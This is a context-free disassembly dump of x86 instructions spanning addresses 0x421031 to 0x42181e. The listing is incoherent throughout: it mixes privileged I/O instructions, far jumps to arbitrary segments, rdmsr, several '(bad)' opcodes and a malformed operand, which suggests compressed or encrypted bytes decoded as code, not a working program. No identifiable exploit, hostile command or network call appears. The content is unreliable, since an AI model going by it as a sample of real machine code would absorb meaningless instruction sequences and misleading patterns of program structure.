  421031:	js     0x420fcd
  421033:	or     BYTE PTR [edx],bl
  421035:	in     al,dx
  421036:	shl    BYTE PTR [ecx],cl
  421038:	inc    ebp
  421039:	sbb    ebp,DWORD PTR [edx+0x6e]
  42103c:	push   cs
  42103d:	in     al,dx
  42103e:	loopne 0x421024
  421040:	shl    BYTE PTR [esi+edi*8-0x52ae7251],cl
  421047:	xchg   esp,eax
  421048:	jo     0x42109c
  42104a:	stos   DWORD PTR es:[edi],eax
  42104b:	mov    ecx,0x58f73028
  421050:	mov    edi,0x9b57683
  421055:	sub    eax,0x9f9761a0
  42105a:	cmp    BYTE PTR [esi],ah
  42105c:	push   ebx
  42105d:	repz aas 
  42105f:	mov    ?,WORD PTR [edi]
  421061:	cmp    al,0x30
  421063:	adc    BYTE PTR [edi-0x5fbaf27],bh
  421069:	out    0x0,al
  42106b:	data16 jle 0x421017
  42106e:	xchg   DWORD PTR [eax+esi*4+0x299c26b9],esp
  421075:	shl    BYTE PTR [eax],0x1b
  421078:	paddb  mm6,mm4
  42107b:	stc    
  42107c:	push   cs
  42107d:	xchg   DWORD PTR [eax+0x2c],esi
  421080:	dec    edx
  421081:	push   ebp
  421082:	jmp    0x42101c
  421084:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421085:	rcl    DWORD PTR [edi+0x43],cl
  421088:	out    dx,eax
  421089:	push   edx
  42108a:	push   esi
  42108b:	or     eax,0x641c7625
  421090:	jl     0x4210b2
  421092:	mov    ebx,edi
  421094:	sbb    eax,0x78f3d7d7
  421099:	sbb    BYTE PTR [ebp+0x23],al
  42109c:	dec    esp
  42109d:	sub    ah,al
  42109f:	or     edi,DWORD PTR [edi+0x6e74237d]
  4210a5:	jmp    0x4210be
  4210a7:	mov    esp,0xa2719873
  4210ac:	cld    
  4210ad:	fs fs popa 
  4210b0:	inc    ecx
  4210b1:	mov    esi,ebx
  4210b3:	mov    dl,cl
  4210b5:	push   ecx
  4210b6:	out    0x1c,eax
  4210b8:	test   ch,dh
  4210ba:	div    dh
  4210bc:	clc    
  4210bd:	fdivrp st(2),st
  4210bf:	shl    BYTE PTR [eax],cl
  4210c1:	pop    esi
  4210c2:	in     al,dx
  4210c3:	sti    
  4210c4:	dec    ebp
  4210c5:	test   BYTE PTR [edx-0x1c51489e],0xc7
  4210cc:	mov    ds:0x592d8cbd,al
  4210d1:	dec    esi
  4210d2:	cmp    dh,BYTE PTR [ecx+edx*2+0x3e]
  4210d6:	xor    al,0x2b
  4210d8:	or     BYTE PTR [ecx+0x40108ab8],dl
  4210de:	dec    edi
  4210df:	push   edx
  4210e0:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  4210e2:	jmp    DWORD PTR [ebp+0x1f]
  4210e5:	xchg   BYTE PTR [ebp-0x2afb78af],ch
  4210eb:	add    esi,DWORD PTR [edx]
  4210ed:	pop    ss
  4210ee:	and    DWORD PTR [esp+eiz*2],ebp
  4210f1:	in     eax,0xab
  4210f3:	mov    eax,ds:0xca49fceb
  4210f8:	mov    ds:0xf6330730,al
  4210fd:	ins    BYTE PTR es:[edi],dx
  4210fe:	push   esi
  4210ff:	mov    eax,ds:0x13594e6e
  421104:	repz ror BYTE PTR [ebp+0x40],1
  421108:	sub    DWORD PTR [edx-0x1],esi
  42110b:	cmp    al,0x70
  42110d:	push   ss
  42110e:	(bad)  
  42110f:	stc    
  421110:	imul   eax,DWORD PTR [ebx],0xd026873d
  421116:	inc    edx
  421117:	push   ds
  421118:	fbld   TBYTE PTR [esi+0x38]
  42111b:	and    eax,0xe42aa78f
  421120:	pusha  
  421121:	(bad)  
  421122:	mov    ah,0x83
  421124:	arpl   WORD PTR [edx],ax
  421126:	imul   ebx,DWORD PTR [ebp+eax*1+0x4b],0xfffffff4
  42112b:	jmp    0x78a5a719
  421130:	loopne 0x4210bd
  421132:	std    
  421133:	outs   dx,BYTE PTR ds:[esi]
  421134:	dec    edx
  421135:	pushf  
  421136:	xchg   DWORD PTR ds:0x2d647355,esi
  42113c:	les    edx,FWORD PTR [ecx+0x4]
  42113f:	pop    ecx
  421140:	and    BYTE PTR [edi+0x7dbea1ed],ch
  421146:	xor    esi,DWORD PTR [eax]
  421148:	loope  0x4211a4
  42114a:	mov    ch,0x6b
  42114c:	jmp    0xae0d:0xe77eaedd
  421153:	or     BYTE PTR [eax],ah
  421155:	test   BYTE PTR [esi-0x72c73ed8],0x94
  42115c:	mov    ch,bl
  42115e:	(bad)  
  42115f:	sub    al,0x97
  421161:	sub    cl,BYTE PTR [edx+0x348fd15b]
  421167:	xor    BYTE PTR [ebp+0x647c267a],0x6c
  42116e:	xchg   BYTE PTR [eax],bh
  421170:	inc    esp
  421171:	sub    al,0x13
  421173:	rcl    BYTE PTR [ecx],cl
  421175:	push   es
  421176:	sbb    esp,0xae79f7a5
  42117c:	mov    ch,0x95
  42117e:	pushf  
  42117f:	ins    DWORD PTR es:[edi],dx
  421180:	inc    edi
  421181:	fist   WORD PTR [edx]
  421183:	xchg   BYTE PTR ds:0xec705ed7,bh
  421189:	jmp    0x421143
  42118b:	mov    ch,0x38
  42118d:	leave  
  42118e:	dec    esi
  42118f:	adc    ebx,DWORD PTR [ecx]
  421191:	cmc    
  421192:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421193:	int3   
  421194:	pusha  
  421195:	inc    ecx
  421196:	rcl    ebx,0x5
  421199:	ret    0xf8e2
  42119c:	inc    edx
  42119d:	sbb    ebx,ebp
  42119f:	aas    
  4211a0:	sbb    al,0xa6
  4211a2:	aad    0x25
  4211a4:	call   0xe3d9:0x8db4fae1
  4211ab:	sbb    eax,0x3b32c788
  4211b0:	das    
  4211b1:	inc    esp
  4211b2:	shr    BYTE PTR [eax-0x4d],1
  4211b5:	loopne 0x42113f
  4211b7:	loopne 0x4211af
  4211b9:	enter  0xcacf,0xb4
  4211bd:	out    0x81,al
  4211bf:	sub    edi,ebx
  4211c1:	or     BYTE PTR [ebp-0x33],cl
  4211c4:	retf   
  4211c5:	xchg   esi,eax
  4211c6:	and    ebp,ecx
  4211c8:	and    ch,BYTE PTR [edi]
  4211ca:	inc    eax
  4211cb:	sub    BYTE PTR [ebx*8+0xbb469bf],bh
  4211d2:	stc    
  4211d3:	imul   esp,edx,0x54
  4211d6:	mov    dh,0x39
  4211d8:	pop    ds
  4211d9:	arpl   WORD PTR [edi-0x158541c8],di
  4211df:	push   ds
  4211e0:	xchg   ecx,eax
  4211e1:	stos   BYTE PTR es:[edi],al
  4211e2:	inc    ebx
  4211e3:	and    ebp,DWORD PTR [edi]
  4211e5:	jle    0x4211c4
  4211e7:	test   esi,esi
  4211e9:	sbb    edi,DWORD PTR [ebx+0x5af5cbb5]
  4211ef:	xchg   DWORD PTR [esi],edx
  4211f1:	jbe    0x4211fb
  4211f3:	push   ss
  4211f4:	and    ah,BYTE PTR [esi+0x62fdf9b4]
  4211fa:	imul   edx,ecx,0x766d79f6
  421200:	sahf   
  421201:	jno    0x4211ae
  421203:	data16 jb 0x42127f
  421206:	mov    WORD PTR [eax],ds
  421208:	inc    edi
  421209:	stc    
  42120a:	sub    DWORD PTR [edi-0x55989ae],esi
  421210:	mov    ds:0xc83e16c2,eax
  421215:	mov    ch,0xd9
  421217:	push   0xffffffbc
  421219:	sub    BYTE PTR [ebp+0x7b811cb],cl
  42121f:	stos   BYTE PTR es:[edi],al
  421220:	icebp  
  421221:	push   es
  421222:	cmp    al,0xcc
  421224:	test   eax,0x5fb85443
  421229:	mov    DWORD PTR [edi],ecx
  42122b:	fstp   st(1)
  42122d:	test   eax,0x12f72c3a
  421232:	adc    eax,0xb1d3feb8
  421237:	jne    0x421255
  421239:	les    ebp,FWORD PTR [edi-0x3e]
  42123c:	sub    edi,DWORD PTR [ecx+0x319e10c1]
  421242:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421243:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421244:	xchg   ebp,eax
  421245:	sbb    edi,ecx
  421247:	xchg   esp,eax
  421248:	sbb    eax,0x8d053577
  42124d:	push   edi
  42124e:	enter  0x29ba,0x7b
  421252:	jb     0x4212cb
  421254:	fs sbb ebx,edx
  421257:	mov    edi,ecx
  421259:	xor    DWORD PTR [ecx],esi
  42125b:	adc    edx,edi
  42125d:	add    ebx,DWORD PTR [eax-0x5f]
  421260:	pop    edx
  421261:	add    ch,0xba
  421264:	es jg  0x4212c4
  421267:	push   esp
  421268:	mov    dh,0x5e
  42126a:	lock jg 0x421250
  42126d:	out    0x76,eax
  42126f:	push   eax
  421270:	push   edx
  421271:	stos   DWORD PTR es:[edi],eax
  421272:	xor    BYTE PTR [edi+0x44e23f38],0x67
  421279:	push   ss
  42127a:	popf   
  42127b:	jl     0x421203
  42127d:	add    edi,ebp
  42127f:	rcl    DWORD PTR [esi],1
  421281:	aad    0xef
  421283:	add    eax,0x3644bb33
  421288:	inc    ebx
  421289:	cmc    
  42128a:	daa    
  42128b:	jg     0x4212d2
  42128d:	push   edi
  42128e:	or     eax,edi
  421290:	shl    BYTE PTR ds:0x42f1543c,cl
  421296:	inc    eax
  421297:	arpl   si,dx
  421299:	cdq    
  42129a:	fcmovbe st,st(6)
  42129c:	repz dec esi
  42129e:	mov    al,0xde
  4212a0:	sub    al,0x97
  4212a2:	ins    BYTE PTR es:[edi],dx
  4212a3:	pop    esp
  4212a4:	leave  
  4212a5:	fs enter 0xec58,0xe8
  4212aa:	pop    esi
  4212ab:	sbb    dl,BYTE PTR [eax]
  4212ad:	leave  
  4212ae:	imul   ecx,edi,0xffffff9f
  4212b1:	loopne 0x4212b8
  4212b3:	cmp    bl,BYTE PTR [esi-0x5c0439ca]
  4212b9:	jmp    0x3772df01
  4212be:	and    edx,DWORD PTR [esi-0x69]
  4212c1:	jbe    0x4212f9
  4212c3:	ret    
  4212c4:	dec    eax
  4212c5:	dec    edx
  4212c6:	or     ch,bl
  4212c8:	push   DWORD PTR [eax-0xd]
  4212cb:	inc    esi
  4212cc:	jae    0x421302
  4212ce:	xchg   edi,esi
  4212d0:	ja     0x421350
  4212d2:	scas   al,BYTE PTR es:[edi]
  4212d3:	adc    BYTE PTR [esi+0x2e],bl
  4212d6:	mov    dl,0x2e
  4212d8:	cmp    eax,0xf81691e1
  4212dd:	lods   al,BYTE PTR ds:[esi]
  4212de:	push   0xf6978c80
  4212e3:	mov    dl,0x35
  4212e5:	lods   eax,DWORD PTR ds:[esi]
  4212e6:	jbe    0x4212e8
  4212e8:	repnz ins BYTE PTR es:[edi],dx
  4212ea:	or     dl,dl
  4212ec:	xor    edx,ebx
  4212ee:	sbb    eax,DWORD PTR [esi-0x56]
  4212f1:	cs ins DWORD PTR es:[edi],dx
  4212f3:	xchg   esi,eax
  4212f4:	imul   eax,DWORD PTR [edx+0x4a],0x550e5800
  4212fb:	fcmovbe st,st(1)
  4212fe:	imul   ecx,DWORD PTR [ecx],0x71
  421301:	test   al,0x3b
  421303:	imul   esi,DWORD PTR [esi],0xf
  421306:	push   esp
  421307:	repnz fsubr QWORD PTR [edx-0x283ccbd]
  42130e:	pushf  
  42130f:	dec    esp
  421310:	fcmovnbe st,st(5)
  421312:	ret    0x9e66
  421315:	sub    al,0x36
  421317:	hlt    
  421318:	hlt    
  421319:	cs or  al,0x56
  42131c:	imul   DWORD PTR [ebp+0x35e0bdcb]
  421322:	xchg   esp,eax
  421323:	(bad)  [eax-0xf241a20]
  421329:	mov    al,0xc2
  42132b:	cvttps2pi mm1,QWORD PTR [ebp+0x4a]
  42132f:	push   ebx
  421330:	mov    edx,0x15404ec4
  421335:	imul   ebx,DWORD PTR [esi-0x6bc17466],0xa2edb547
  42133f:	sub    eax,0x65bbfe88
  421344:	fimul  WORD PTR [edi]
  421346:	push   esi
  421347:	(bad)  
  421348:	aam    0xba
  42134a:	pop    ecx
  42134b:	or     al,0xc9
  42134d:	xchg   ebx,eax
  42134e:	stos   BYTE PTR es:[edi],al
  42134f:	xchg   ecx,eax
  421350:	jnp    0x421395
  421352:	or     edx,DWORD PTR [edi+0x60488a00]
  421358:	sub    eax,0xd3b9b4ea
  42135d:	sub    cl,BYTE PTR [ecx]
  42135f:	loope  0x42130f
  421361:	mov    ebp,0x2334ea44
  421366:	sub    al,0xa7
  421368:	cmp    BYTE PTR [bp+si-0x5b7],0x23
  42136e:	mov    ds,ebp
  421370:	daa    
  421371:	and    ecx,DWORD PTR [edi-0x2a1a5f4b]
  421377:	mov    ds:0xd00a866e,al
  42137c:	mov    WORD PTR [ecx],cs
  42137e:	xchg   ecx,eax
  42137f:	repz popf 
  421381:	sub    BYTE PTR [eax-0x42157dcc],ch
  421387:	mov    al,0xc8
  421389:	out    dx,eax
  42138a:	fimul  DWORD PTR [edi-0x52]
  42138d:	dec    esi
  42138e:	xlat   BYTE PTR fs:[ebx]
  421390:	out    dx,eax
  421391:	sbb    edi,esi
  421393:	sbb    DWORD PTR [ebx+0x1c03e988],eax
  421399:	je     0x421367
  42139b:	adc    DWORD PTR [eax],edi
  42139d:	or     ch,bh
  42139f:	das    
  4213a0:	test   DWORD PTR [edi+ebp*1+0x58],ebx
  4213a4:	jl     0x42141a
  4213a6:	or     BYTE PTR [esi],0x80
  4213a9:	xchg   edx,eax
  4213aa:	inc    esp
  4213ab:	mov    ds:0xb772154d,al
  4213b0:	stos   BYTE PTR es:[edi],al
  4213b1:	fdiv   DWORD PTR ds:0xfce70302
  4213b7:	or     eax,0x7dc4441
  4213bc:	stos   BYTE PTR es:[edi],al
  4213bd:	ja     0x4213a7
  4213bf:	sbb    al,0x98
  4213c1:	cwde   
  4213c2:	les    esi,FWORD PTR [ecx-0x72]
  4213c5:	pop    ds
  4213c6:	xchg   ebp,eax
  4213c7:	jae    0x421402
  4213c9:	mov    esp,0x99410c9e
  4213ce:	push   ecx
  4213cf:	mov    dl,0xe
  4213d1:	fadd   QWORD PTR [esi+0x2c]
  4213d4:	jne    0x421418
  4213d6:	(bad)
  4213d9:	mov    esi,0xf767ce7b
  4213de:	xchg   DWORD PTR [edi+0x5325e44e],esp
  4213e4:	jle    0x4213e1
  4213e6:	sbb    dh,BYTE PTR [esi]
  4213e8:	push   ebx
  4213e9:	ror    esp,1
  4213eb:	(bad)  
  4213ec:	cmp    ecx,ecx
  4213ee:	pop    esp
  4213ef:	or     eax,0xc75032ea
  4213f4:	push   esi
  4213f5:	lea    edi,[edx]
  4213f7:	sub    ebp,DWORD PTR [edi+ebp*8+0x7b8d7d37]
  4213fe:	lahf   
  4213ff:	in     al,dx
  421400:	dec    eax
  421401:	stos   BYTE PTR es:[edi],al
  421402:	outs   dx,DWORD PTR ds:[esi]
  421403:	mov    esi,0xdb0323c9
  421408:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421409:	sub    dh,BYTE PTR [edx+0x5a]
  42140c:	jmp    0xb6a81f2d
  421411:	sbb    DWORD PTR [esi-0x75],edx
  421414:	adc    DWORD PTR [ebx+eax*8+0x53b9f2b8],esi
  42141b:	adc    DWORD PTR [esi+0xf5cf6cc],esi
  421421:	in     eax,dx
  421422:	cwde   
  421423:	jne    0x421484
  421425:	dec    edx
  421426:	sbb    dh,al
  421428:	or     al,0xa0
  42142a:	nop
  42142b:	adc    ebp,DWORD PTR [edi+0x4f723a9c]
  421431:	sbb    al,0x8b
  421433:	mov    ah,0x3f
  421435:	popf   
  421436:	pop    ebp
  421437:	adc    esp,DWORD PTR [edx+0x1e5f0a75]
  42143d:	cmp    eax,0xd190c751
  421442:	jbe    0x4214a1
  421444:	jle    0x421484
  421446:	push   ds
  421447:	adc    al,0xdb
  421449:	add    cl,BYTE PTR [edi-0x7e]
  42144c:	std    
  42144d:	xchg   ecx,eax
  42144e:	jmp    0x42145e
  421450:	mov    bh,0x85
  421452:	xor    eax,0x8e10a7a6
  421457:	pop    esi
  421458:	icebp  
  421459:	sbb    eax,0x3ec9c904
  42145e:	jno    0x421465
  421460:	dec    eax
  421461:	mov    edx,0xe150eac4
  421466:	out    dx,al
  421467:	inc    esi
  421468:	adc    eax,DWORD PTR [ecx+0xc225cef]
  42146e:	jae    0x421454
  421470:	pusha  
  421471:	cmp    cl,dl
  421473:	mov    edx,0x1545097e
  421478:	gs push eax
  42147a:	cmp    BYTE PTR [esi-0x3f],0xea
  42147e:	push   ebx
  42147f:	scas   eax,DWORD PTR es:[edi]
  421480:	int3   
  421481:	jne    0x421454
  421483:	call   0xee044858
  421488:	jbe    0x4214d9
  42148a:	mov    cl,0x62
  42148c:	addr16 aas 
  42148e:	sbb    DWORD PTR [ecx+0x52],0xf27e66b9
  421495:	pop    edx
  421496:	fldcw  WORD PTR ds:0x8886f481
  42149c:	ins    DWORD PTR es:[edi],dx
  42149d:	xchg   esp,eax
  42149e:	jl     0x421472
  4214a0:	div    DWORD PTR [ecx]
  4214a2:	pop    esi
  4214a3:	mov    ebx,0x3cd92b3c
  4214a8:	inc    edx
  4214a9:	jne    0x421436
  4214ab:	dec    esi
  4214ac:	ss cmp al,0x74
  4214af:	add    eax,0xa7a855d6
  4214b4:	jecxz  0x421485
  4214b6:	mov    esp,0x6b7b6c29
  4214bb:	push   0x3e
  4214bd:	jmp    0xbe91:0x53b2b5fc
  4214c4:	test   BYTE PTR [ecx-0x2ac97c7c],dh
  4214ca:	mov    esp,0x593a0c9b
  4214cf:	ret    0xb09d
  4214d2:	dec    ebx
  4214d3:	icebp  
  4214d4:	mov    edi,0xbd04c9c8
  4214d9:	clc    
  4214da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4214db:	mov    edx,0x4911c072
  4214e0:	fimul  WORD PTR [edx+ecx*4]
  4214e3:	jns    0x421528
  4214e5:	pop    eax
  4214e6:	xchg   DWORD PTR [edx+0x69d915b2],ecx
  4214ec:	xor    al,BYTE PTR [edx+edi*1]
  4214ef:	pop    edi
  4214f0:	sahf   
  4214f1:	popf   
  4214f2:	jo     0x42152b
  4214f4:	sbb    eax,0xc2743840
  4214f9:	adc    DWORD PTR [edx-0x7d40e035],edx
  4214ff:	xor    DWORD PTR [ebp-0x46],esi
  421502:	mov    al,ds:0x4f88f0d8
  421507:	pop    ebx
  421508:	jbe    0x421502
  42150a:	pop    ebx
  42150b:	bound  ecx,QWORD PTR [esi+0x6ece2c12]
  421511:	push   0xffffffb4
  421513:	loopne 0x42149d
  421515:	sbb    eax,0xe1c19c57
  42151a:	aas    
  42151b:	sbb    eax,0x9030acb3
  421520:	inc    ecx
  421521:	call   0xb8d5:0x71bf61b1
  421528:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421529:	mov    eax,ds:0x6450f091
  42152e:	stc    
  42152f:	cdq    
  421530:	pop    esi
  421531:	icebp  
  421532:	xchg   esi,eax
  421533:	sar    BYTE PTR [edx+eax*4-0x61],1
  421537:	or     eax,0x33d66a74
  42153c:	and    al,0xc1
  42153e:	leave  
  42153f:	cld    
  421540:	adc    DWORD PTR [esi],edi
  421542:	jmp    0xae17:0xdd880771
  421549:	sbb    DWORD PTR [edi+0x33b0bbe8],ebp
  42154f:	mov    edx,0xa9a917c8
  421554:	aam    0xb7
  421556:	add    esi,esp
  421558:	retf   0x5b66
  42155b:	mov    esp,0x20a36ed2
  421560:	inc    ebx
  421561:	adc    BYTE PTR [edx-0x4d790647],al
  421567:	mov    ds:0x5a570000,al
  42156c:	dec    edx
  42156d:	inc    esi
  42156e:	dec    edi
  42156f:	push   esi
  421570:	pop    edi
  421571:	pop    ebx
  421572:	push   esp
  421573:	inc    eax
  421574:	cmp    eax,0xbaa804b5
  421579:	inc    esi
  42157a:	je     0x421520
  42157c:	add    DWORD PTR [eax],eax
  42157e:	xchg   BYTE PTR [esi],al
  421580:	add    BYTE PTR [eax],al
  421582:	add    al,0x33
  421584:	lahf   
  421585:	adc    eax,0xf6cb58ed
  42158a:	mov    ah,0xb2
  42158c:	retf   
  42158d:	xchg   ecx,eax
  42158e:	xchg   edx,eax
  42158f:	(bad)  
  421590:	xor    eax,0x4d196bab
  421595:	add    ebx,0x2d46ccb9
  42159b:	mov    ebx,DWORD PTR [edi+edx*2]
  42159e:	sbb    bl,BYTE PTR [ecx-0x50]
  4215a1:	xchg   edi,eax
  4215a2:	sub    ecx,DWORD PTR [ebp+eax*1-0x19]
  4215a6:	scas   eax,DWORD PTR es:[edi]
  4215a7:	jne    0x421545
  4215a9:	repz cmp cl,cl
  4215ac:	mov    esi,0x48ba9441
  4215b1:	or     DWORD PTR [edi-0x4c0e80a5],0x39
  4215b8:	add    edx,ebx
  4215ba:	push   0x4d7222ce
  4215bf:	pop    ebp
  4215c0:	outs   dx,BYTE PTR ds:[esi]
  4215c1:	inc    esi
  4215c2:	cdq    
  4215c3:	je     0x4215b2
  4215c5:	add    al,0x36
  4215c7:	sub    DWORD PTR [edi+0x1f9c2fbc],edx
  4215cd:	xchg   BYTE PTR [ebx],cl
  4215cf:	inc    edi
  4215d0:	or     BYTE PTR [edi-0x5c712d7b],bh
  4215d6:	fdiv   st,st(0)
  4215d8:	shl    BYTE PTR [esi],1
  4215da:	mov    ds:0x41245dce,al
  4215df:	sub    BYTE PTR [ecx+0x1f],al
  4215e2:	and    DWORD PTR [esi-0x2e06911c],0xd33df334
  4215ec:	and    BYTE PTR [edi+0x51],ch
  4215ef:	mov    ch,al
  4215f1:	fbld   TBYTE PTR [eax]
  4215f4:	lock lods al,BYTE PTR ds:[esi]
  4215f6:	inc    ebp
  4215f7:	pushf  
  4215f8:	and    BYTE PTR [ecx-0x27],dh
  4215fb:	mov    esi,0x3e9f6d6
  421600:	mov    ds:0x30669d15,al
  421605:	cmp    eax,0xad8a0536
  42160a:	sbb    al,0x98
  42160c:	ror    BYTE PTR [ecx+0x3a],0x3
  421610:	sbb    eax,0x4095c231
  421615:	dec    ebx
  421616:	cmp    al,0xf0
  421618:	pushf  
  421619:	add    bl,BYTE PTR [edx-0x5c9e3439]
  42161f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421620:	mov    bh,cl
  421622:	and    esp,0x24
  421625:	jne    0x421610
  421627:	push   esp
  421628:	mov    esp,0xa3a093c3
  42162d:	shr    DWORD PTR [ebp-0x4f],0xce
  421631:	das    
  421632:	popa   
  421633:	mov    edx,0xd4b97a16
  421638:	pop    edx
  421639:	mov    ds:0xb28e94b4,al
  42163e:	outs   dx,BYTE PTR ds:[esi]
  42163f:	mov    al,0x0
  421641:	hlt    
  421642:	mov    edx,eax
  421644:	jo     0x421690
  421646:	push   edi
  421647:	test   DWORD PTR [ebx-0x1f99edf5],ebx
  42164d:	or     BYTE PTR [ecx-0x2a],0xa9
  421651:	and    al,0x20
  421653:	icebp  
  421654:	mov    ch,0x7c
  421656:	push   0xa0e5fa67
  42165b:	fdivr  QWORD PTR [edx+0xf]
  42165e:	outs   dx,BYTE PTR ds:[esi]
  42165f:	cmp    bl,ch
  421661:	push   edx
  421662:	jbe    0x4215f5
  421664:	pusha  
  421665:	sar    DWORD PTR [ebx+0x2b],1
  421668:	mov    dh,BYTE PTR [ecx+0xc]
  42166b:	jns    0x4215f1
  42166d:	sbb    edi,DWORD PTR [esp+ebx*2-0x7434ea17]
  421674:	jne    0x421693
  421676:	sti    
  421677:	repnz in eax,dx
  421679:	sbb    eax,DWORD PTR [ecx+eax*1-0x3e40b1a3]
  421680:	adc    al,0x9b
  421682:	sbb    al,0x91
  421684:	inc    esi
  421685:	dec    esi
  421686:	ror    DWORD PTR [edi],0xb1
  421689:	mov    es,ebp
  42168b:	sub    eax,DWORD PTR [ebp-0x7e]
  42168e:	into   
  42168f:	xor    ebx,DWORD PTR [edi]
  421691:	mov    ds:0xff810014,eax
  421696:	into   
  421697:	mov    ds:0xeedba0b4,al
  42169c:	mov    al,0xda
  42169e:	cmp    al,0x67
  4216a0:	cli    
  4216a1:	xchg   ecx,eax
  4216a2:	cli    
  4216a3:	js     0x421712
  4216a5:	jp     0x421676
  4216a7:	popf   
  4216a8:	enter  0xeea2,0x68
  4216ac:	fwait
  4216ad:	test   eax,0x2fe96847
  4216b2:	fxch   st(5)
  4216b5:	and    DWORD PTR [ecx-0x2d],esi
  4216b8:	out    0x7f,eax
  4216ba:	test   al,0x24
  4216bc:	lahf   
  4216bd:	push   ebp
  4216be:	add    esi,eax
  4216c0:	mov    dl,0x1c
  4216c2:	pop    eax
  4216c3:	ret    0x88b8
  4216c6:	sub    dl,BYTE PTR [eax+0x70]
  4216c9:	xchg   edx,eax
  4216ca:	cli    
  4216cb:	xor    edi,DWORD PTR [eax+0x4e]
  4216ce:	push   cs
  4216cf:	adc    DWORD PTR [esi-0x7c0e6869],ecx
  4216d5:	adc    al,0x79
  4216d7:	aas    
  4216d8:	lods   eax,DWORD PTR ds:[esi]
  4216d9:	and    edx,edx
  4216db:	cli    
  4216dc:	inc    eax
  4216dd:	mov    al,ds:0x7a46d713
  4216e2:	mov    ah,0x4b
  4216e4:	xor    DWORD PTR [esi],0x2e02b902
  4216ea:	push   0x18
  4216ec:	cli    
  4216ed:	adc    eax,0xac7ddf8b
  4216f2:	out    0x30,al
  4216f4:	and    al,0x73
  4216f6:	aad    0x53
  4216f8:	xchg   DWORD PTR [edx+0x25],esi
  4216fb:	add    al,0xad
  4216fd:	ret    
  4216fe:	adc    BYTE PTR [edi+0x11169eb6],bl
  421704:	xor    eax,0x6b140d54
  421709:	cld    
  42170a:	(bad)  
  42170b:	mov    esp,0x1b970e90
  421710:	cdq    
  421711:	mov    BYTE PTR [esi+0x45602d71],dh
  421717:	push   ds
  421718:	rdmsr  
  42171a:	fdivr  DWORD PTR [ecx+0x14]
  42171d:	cs jbe 0x421753
  421720:	outs   dx,DWORD PTR ds:[esi]
  421721:	aam    0x3b
  421723:	cld    
  421724:	fisttp QWORD PTR [edx-0x46]
  421727:	pop    ebx
  421728:	dec    DWORD PTR [edi+0x18]
  42172b:	mov    dl,0xd0
  42172d:	out    0x9a,al
  42172f:	mov    eax,0x84cb00c8
  421734:	add    al,0x53
  421736:	popa   
  421737:	jns    0x421762
  421739:	adc    bh,BYTE PTR [ecx-0x1c41307b]
  42173f:	repnz mov eax,ds:0x94c05dd7
  421745:	ror    BYTE PTR [edx-0x4f],1
  421748:	and    DWORD PTR [esi],ebx
  42174a:	into   
  42174b:	push   ds
  42174c:	js     0x42174a
  42174e:	fld    QWORD PTR [ebp-0x31]
  421751:	fdiv   st(3),st
  421753:	jl     0x42176f
  421755:	out    0xc4,al
  421757:	push   es
  421758:	fsubr  DWORD PTR [edx+0x50a94173]
  42175e:	ror    cl,1
  421760:	xlat   BYTE PTR ds:[ebx]
  421761:	shl    BYTE PTR [ebx-0x5e],0x8b
  421765:	mov    ds:0x5dbba03c,eax
  42176a:	std    
  42176b:	jae    0x42173d
  42176d:	lock cdq 
  42176f:	push   ebp
  421770:	mov    ch,0x29
  421772:	adc    cl,bl
  421774:	push   0x156fba1d
  421779:	jbe    0x421717
  42177b:	repnz ror DWORD PTR [esi-0x688ed3a1],cl
  421782:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421783:	neg    ah
  421785:	or     DWORD PTR [esi+esi*2+0x66],0x38
  42178a:	add    ebx,DWORD PTR [edi+0x63]
  42178d:	enter  0xe712,0x3b
  421791:	push   edx
  421792:	cld    
  421793:	sub    BYTE PTR [eax],ah
  421795:	xchg   edx,eax
  421796:	fbstp  TBYTE PTR [ebp+0x1e]
  421799:	cdq    
  42179a:	sub    BYTE PTR [ebx-0x32f027d3],ah
  4217a0:	pusha  
  4217a1:	cmp    al,0x2a
  4217a3:	inc    esi
  4217a4:	mov    ah,0x21
  4217a6:	xchg   ebp,eax
  4217a7:	mov    bh,0x50
  4217a9:	rcl    BYTE PTR [edx],0xbe
  4217ac:	xchg   edi,eax
  4217ad:	hlt    
  4217ae:	and    DWORD PTR [eax],eax
  4217b0:	pop    ss
  4217b1:	push   eax
  4217b2:	mov    al,ds:0x359be0a4
  4217b7:	jns    0x421763
  4217b9:	addr16 pushf 
  4217bb:	icebp  
  4217bc:	cld    
  4217bd:	adc    DWORD PTR [ecx+eax*1],esp
  4217c0:	add    ah,bh
  4217c2:	or     esi,DWORD PTR [ecx+ecx*8-0xf]
  4217c6:	xor    dl,BYTE PTR [esi+0x5e]
  4217c9:	jne    0x4217b0
  4217cb:	mov    bl,0x2d
  4217cd:	mov    ch,0xbf
  4217cf:	jae    0x421829
  4217d1:	sub    esp,ebp
  4217d3:	lds    ebx,FWORD PTR [edi-0x1]
  4217d6:	in     eax,0x9a
  4217d8:	jl     0x421857
  4217da:	push   esi
  4217db:	dec    ebx
  4217dc:	sbb    DWORD PTR [edi-0x19fb0e8a],ebx
  4217e2:	mov    ebp,0x1d49be08
  4217e7:	push   esi
  4217e8:	out    dx,al
  4217e9:	popa   
  4217ea:	in     eax,dx
  4217eb:	arpl   WORD PTR [eax-0x739818c1],sp
  4217f1:	jmp    0xea0ee554
  4217f6:	outs   dx,BYTE PTR ds:[esi]
  4217f7:	adc    BYTE PTR [edi],dh
  4217f9:	or     DWORD PTR cs:[ebx+eax*2],0xffffff94
  4217fe:	sbb    DWORD PTR [ebx-0x13],esp
  421801:	sbb    ebp,DWORD PTR [edx-0x19]
  421804:	test   al,0x2
  421806:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421807:	int    0xfb
  421809:	out    dx,al
  42180a:	pop    ebp
  42180b:	jno    0x4217fb
  42180d:	xor    ah,BYTE PTR [ebp-0x409c85ca]
  421813:	fiadd  DWORD PTR [esi+edx*4]
  421816:	sbb    al,0x3d
  421818:	push   ebx
  421819:	jo     0x421860
  42181b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42181c:	push   edx
  42181d:	popa   
  42181e:	pop    es
